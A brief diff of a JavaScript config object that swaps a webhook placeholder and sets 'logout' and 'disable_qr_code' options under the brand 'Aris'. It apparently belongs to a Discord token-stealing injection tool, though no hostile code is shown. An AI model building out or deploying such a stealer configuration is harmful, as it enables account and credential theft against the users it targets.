@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Aris",
 
-    webhook: '%WEBHOOK%1',
+    webhook: '%WEBHOOK_LINK%',
 
     logout: true,
     disable_qr_code: true,
